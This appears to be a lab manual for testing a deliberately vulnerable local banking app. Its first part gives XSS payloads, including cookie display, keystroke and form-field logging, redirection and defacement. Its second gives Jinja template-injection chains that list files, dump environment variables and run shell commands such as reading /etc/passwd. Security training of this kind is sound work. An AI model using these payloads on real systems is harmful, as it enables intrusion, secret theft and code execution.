# XSS and Template Injection Testing Manual

## Environment Setup

Before starting, ensure you have:
- Banking-app container running
- Browser Developer Tools open (F12)
- Multiple browser tabs for testing

### Monitoring Setup
1. **Browser Console**: Keep F12 Developer Tools open to catch XSS alerts
2. **Network Tab**: Monitor requests to detect successful injections
3. **Application Logs**: `docker logs banking-app` to see server-side errors

---

## Part 1: XSS (Cross-Site Scripting) Testing

### Target: Feedback System

**Vulnerable Endpoints:**
- `/submit_feedback` - Input point for XSS payloads
- `/feedback/<id>` - XSS execution point (renders `{{ feedback.message|safe }}`)

### Basic XSS Tests

**Test 1: Simple Alert Box**
```
<script>alert('XSS Vulnerability Found!')</script>
```
- **Expected Result**: Alert box appears when viewing feedback detail
- **Impact**: Confirms basic XSS execution

**Test 2: Cookie Theft**
```
<script>alert('Your cookies: ' + document.cookie)</script>
```
- **Expected Result**: Shows user's session cookies
- **Impact**: Demonstrates potential session hijacking

**Test 3: Page Redirection**
```
<script>window.location.href='http://127.0.0.1:8888'</script>
```
- **Expected Result**: Redirects viewers to external site
- **Impact**: Shows potential for phishing attacks

### Advanced XSS Payloads

**Test 4: Keylogger Simulation**
```
<script>
document.addEventListener('keydown', function(e) {
    console.log('Key pressed: ' + e.key);
});
alert('Keylogger activated - check console');
</script>
```

**Test 5: Form Data Theft**
```
<script>
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('change', function() {
        console.log('Field: ' + this.name + ', Value: ' + this.value);
    });
});
alert('Form monitoring activated');
</script>
```

**Test 6: DOM Manipulation**
```
<script>
document.body.innerHTML = '<h1 style="color:red;">WEBSITE COMPROMISED</h1>';
</script>
```

### XSS via HTML Attributes

**Test 7: Event Handler Injection**
```
<img src="x" onerror="alert('XSS via image error')">
```

**Test 8: SVG-based XSS**
```
<svg onload="alert('SVG XSS')"></svg>
```

### Testing Steps for XSS

1. **Navigate to Feedback Submission:**
   ```
   http://localhost:5000/submit_feedback
   ```

2. **Submit payload in the message field**

3. **View the feedback detail page:**
   ```
   http://localhost:5000/feedback/<feedback_id>
   ```

4. **Check for execution:**
   - Alert boxes appearing
   - Console messages
   - DOM changes
   - Network requests


## Part 2: Server-Side Template Injection (SSTI) Testing

### Target: Transaction Notes System

**Vulnerable Function:** `transaction_detail()` in transaction routes
**Injection Point:** Transaction note field  

### Basic Template Injection Tests

**Test 1: Template Expression Evaluation**
```
{{ 7 * 7 }}
```
- **Expected Result**: Displays "49" instead of "{{ 7 * 7 }}"
- **Impact**: Confirms template injection

**Test 2: Object Introspection**
```
{{ current_user.email }}
```
- **Expected Result**: Displays the current user's username
- **Impact**: Shows access to application objects

**Test 3: Configuration Access**
```
{{ config.SECRET_KEY }}
```
- **Expected Result**: Might display the application's secret key
- **Impact**: Critical security information disclosure

### Advanced SSTI Payloads

**Test 4: File System Access**
```
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].listdir('.') }}
```
- **Expected Result**: Lists files in current directory
- **Impact**: File system enumeration

**Test 5: Environment Variables**
```
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].environ }}
```
- **Expected Result**: Displays all environment variables
- **Impact**: Sensitive configuration exposure

**Test 6: Command Execution (if possible)**
```
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].check_output(['cat /etc/passwd'], shell=True, text=True) }}
```
- **Expected Result**: May execute system commands
- **Impact**: Remote code execution


### Testing Steps for SSTI

1. **Access a transaction detail page:**
   ```
   http://localhost:5000/transaction/<transaction_id>
   ```

2. **Edit the transaction note with SSTI payload**

3. **Submit the note update**

4. **Observe the rendered result:**
   - Check if template expressions are evaluated
   - Look for error messages that reveal information
   - Monitor application logs for exceptions
